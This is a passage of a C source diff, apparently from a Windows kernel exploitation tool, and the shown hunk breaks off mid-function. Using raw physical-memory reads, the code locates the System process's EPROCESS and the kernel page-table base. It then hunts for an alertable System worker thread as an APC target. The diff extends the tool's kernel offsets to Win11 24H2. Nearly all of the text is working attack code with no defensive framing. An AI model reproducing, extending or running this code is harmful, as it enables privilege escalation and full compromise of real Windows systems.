@@ -229,12 +229,25 @@ static uint64_t kva_to_pa(uint64_t va)
     return (e&0x000FFFFFFFFFF000ULL)|(va&0xFFF);
 }
 
+/* EPROCESS / ETHREAD offset layout — supports Win10/pre-24H2 and Win11 24H2+ */
+typedef struct {
+    uint32_t pid;       /* EPROCESS.UniqueProcessId        */
+    uint32_t links;     /* EPROCESS.ActiveProcessLinks     */
+    uint32_t name;      /* EPROCESS.ImageFileName          */
+    uint32_t thd_list;  /* EPROCESS.ThreadListHead         */
+    uint32_t thd_entry; /* ETHREAD.ThreadListEntry         */
+} EpLayout;
+static const EpLayout g_ep_variants[] = {
+    { 0x1D0, 0x1D8, 0x338, 0x370, 0x578 }, /* Win11 24H2+ (build 26100+)  */
+    { 0x440, 0x448, 0x5A8, 0x5E0, 0x4E8 }, /* Win10 / Win11 pre-24H2      */
+};
+static const EpLayout *g_ep = NULL;
+
 static uint64_t g_sys_pa = 0, g_sys_va = 0;
 static int find_system(void)
 {
-    /* Robust scan: page stride + 16-byte inner + Flink/Blink + multi-offset name */
-    static const uint32_t name_offs[] = { 0x5A8, 0x5B8, 0x5B0 };
     static uint8_t page[0x1000];
+    /* sub_max: safe for both layouts (largest fixed read: Win10 Blink @ 0x450+7=0x457) */
     const int sub_max = 0x1000 - 0x458;
 
     for (int r = 0; r < g_nranges; r++) {
@@ -242,20 +255,22 @@ static int find_system(void)
         for (uint64_t page_pa = base; page_pa + 0x1000 <= end; page_pa += 0x1000) {
             if (!phys_read(page_pa, page, 0x1000)) continue;
             for (int sub = 0; sub <= sub_max; sub += 0x10) {
-                uint64_t pid; memcpy(&pid, page + sub + 0x440, 8);
-                if (pid != 4) continue;
-                uint64_t dtb; memcpy(&dtb, page + sub + 0x028, 8);
-                if (!dtb || (dtb & 0xFFF) || dtb < 0x10000 || (dtb >> 40)) continue;
-                uint64_t flink; memcpy(&flink, page + sub + 0x448, 8);
-                uint64_t blink; memcpy(&blink, page + sub + 0x450, 8);
-                if ((flink >> 48) != 0xFFFF || (blink >> 48) != 0xFFFF) continue;
-                uint64_t eproc_pa = page_pa + (uint64_t)sub;
-                for (int ni = 0; ni < 3; ni++) {
+                for (int vi = 0; vi < 2; vi++) {
+                    const EpLayout *L = &g_ep_variants[vi];
+                    uint64_t pid; memcpy(&pid, page + sub + L->pid, 8);
+                    if (pid != 4) continue;
+                    uint64_t dtb; memcpy(&dtb, page + sub + 0x028, 8);
+                    if (!dtb || (dtb & 0xFFF) || dtb < 0x10000 || (dtb >> 40)) continue;
+                    uint64_t flink; memcpy(&flink, page + sub + L->links, 8);
+                    uint64_t blink; memcpy(&blink, page + sub + L->links + 8, 8);
+                    if ((flink >> 48) != 0xFFFF || (blink >> 48) != 0xFFFF) continue;
+                    uint64_t eproc_pa = page_pa + (uint64_t)sub;
                     char nm[8] = {0};
-                    if (!phys_read(eproc_pa + name_offs[ni], nm, 8)) continue;
+                    if (!phys_read(eproc_pa + L->name, nm, 8)) continue;
                     if (memcmp(nm, "System\0\0", 7) != 0) continue;
                     g_sys_pa = eproc_pa;
                     g_kcr3   = dtb;
+                    g_ep     = L;
                     return 1;
                 }
             }
@@ -267,12 +282,13 @@ static int find_system(void)
 /* Derive System EPROCESS kernel VA from ActiveProcessLinks blink of next entry */
 static void derive_system_va(void)
 {
-    uint64_t flink = phys_read64(g_sys_pa + 0x448);
+    if (!g_ep) return;
+    uint64_t flink = phys_read64(g_sys_pa + g_ep->links);
     if (!flink) return;
     uint64_t fpa = kva_to_pa(flink);
     if (!fpa) return;
     uint64_t blink = phys_read64(fpa + 8); /* blink of next → VA of System.links */
-    g_sys_va = blink - 0x448;
+    g_sys_va = blink - g_ep->links;
 }
 
 /* ══════════════════════════════════════════════════════════════════════════
@@ -287,11 +303,13 @@ static void derive_system_va(void)
  * Worker threads are typically alertable when idle.
  * ══════════════════════════════════════════════════════════════════════════ */
 
-#define EP_THREAD_LIST_OFF   0x5E0  /* EPROCESS.ThreadListHead */
-#define ET_THREAD_LIST_OFF   0x4E8  /* ETHREAD.ThreadListEntry (approximate) */
-#define KT_APC_STATE_OFF     0x098  /* KTHREAD.ApcState */
-#define KT_ALERTABLE_OFF     0x184  /* KTHREAD.Alertable (UCHAR, Win10/11 approx) */
-#define KT_WAITMODE_OFF      0x185  /* KTHREAD.WaitMode (UCHAR) */
+#define KT_APC_STATE_OFF      0x098  /* KTHREAD.ApcState (stable Win10/11) */
+/* Alertable check — both layouts tried (OR): */
+#define KT_ALERTABLE_OFF      0x184  /* Win10/pre-24H2: KTHREAD.Alertable (UCHAR) */
+#define KT_WAITMODE_OFF       0x185  /* Win10/pre-24H2: KTHREAD.WaitMode (UCHAR) */
+#define KT_MISCFLAGS_OFF      0x074  /* Win11 24H2+: KTHREAD.MiscFlags (UCHAR) */
+#define KT_MISC_ALERTABLE_BIT 0x10   /* bit 4 of MiscFlags = Alertable in Win11 24H2+ */
+#define KT_WAITMODE24_OFF     0x187  /* Win11 24H2+: KTHREAD.WaitMode (UCHAR) */
 
 typedef struct {
     uint64_t ethread_pa;
@@ -301,32 +319,40 @@ typedef struct {
 static EThread find_worker_ethread(void)
 {
     EThread result = {0, 0};
-    if (!g_sys_va || !g_kcr3) return result;
+    if (!g_ep || !g_sys_va || !g_kcr3) return result;
+
+    uint32_t ep_thd_list  = g_ep->thd_list;
+    uint32_t et_thd_entry = g_ep->thd_entry;
 
     /* ThreadListHead flink = VA of first ETHREAD.ThreadListEntry */
-    uint64_t list_head_pa = g_sys_pa + EP_THREAD_LIST_OFF;
-    uint64_t first_flink  = phys_read64(list_head_pa);
+    uint64_t list_head_pa  = g_sys_pa + ep_thd_list;
+    uint64_t first_flink   = phys_read64(list_head_pa);
     if (!first_flink) return result;
 
-    uint64_t list_head_kva = g_sys_va + EP_THREAD_LIST_OFF;
-    uint64_t cur_flink = first_flink;
+    uint64_t list_head_kva = g_sys_va + ep_thd_list;
+    uint64_t cur_flink     = first_flink;
     int tries = 0;
 
     while (cur_flink != list_head_kva && tries++ < 512) {
-        /* cur_flink = KVA of ETHREAD.ThreadListEntry → ETHREAD KVA = cur_flink - ET_THREAD_LIST_OFF */
-        uint64_t et_kva = cur_flink - ET_THREAD_LIST_OFF;
+        /* cur_flink = KVA of ETHREAD.ThreadListEntry → ETHREAD KVA */
+        uint64_t et_kva = cur_flink - et_thd_entry;
         uint64_t et_pa  = kva_to_pa(et_kva);
         if (!et_pa) { cur_flink = 0; break; }
 
-        /* Check Alertable or WaitMode to find an alertable thread */
-        uint8_t alertable = phys_read8(et_pa + KT_ALERTABLE_OFF);
-        uint8_t waitmode  = phys_read8(et_pa + KT_WAITMODE_OFF);
+        /* Check alertable: OR of Win10/pre-24H2 and Win11 24H2+ detection */
+        uint8_t alertable10  = phys_read8(et_pa + KT_ALERTABLE_OFF);   /* Win10 Alertable byte */
+        uint8_t waitmode10   = phys_read8(et_pa + KT_WAITMODE_OFF);    /* Win10 WaitMode */
+        uint8_t misc24       = phys_read8(et_pa + KT_MISCFLAGS_OFF);   /* Win11 24H2 MiscFlags */
+        uint8_t alertable24  = (misc24 & KT_MISC_ALERTABLE_BIT) ? 1 : 0;
+        uint8_t waitmode24   = phys_read8(et_pa + KT_WAITMODE24_OFF);  /* Win11 24H2 WaitMode */
+        uint8_t alertable    = alertable10 || alertable24;
+        uint8_t waitmode     = waitmode10  || waitmode24;
 
         if (alertable || waitmode) {
             result.ethread_pa  = et_pa;
             result.ethread_kva = et_kva;
             printf("[+] Found alertable ETHREAD: PA %016"PRIx64" KVA %016"PRIx64
-                   " alertable=%d waitmode=%d\n",
+                   " alert=%d wm=%d\n",
                    et_pa, et_kva, alertable, waitmode);
             return result;
         }
@@ -334,12 +360,12 @@ static EThread find_worker_ethread(void)
         /* Advance: read Flink of current ETHREAD.ThreadListEntry */
         uint64_t nxt_pa = kva_to_pa(cur_flink);
         if (!nxt_pa) break;
-        cur_flink = phys_read64(nxt_pa); /* Flink of ThreadListEntry */
+        cur_flink = phys_read64(nxt_pa);
     }
 
-    /* If no alertable thread found, just use the first one */
+    /* If no alertable thread found, use the first — System worker threads always accept APCs */
     if (first_flink != list_head_kva) {
-        uint64_t et_kva = first_flink - ET_THREAD_LIST_OFF;
+        uint64_t et_kva = first_flink - et_thd_entry;
         uint64_t et_pa  = kva_to_pa(et_kva);
         if (et_pa) {
             result.ethread_pa  = et_pa;
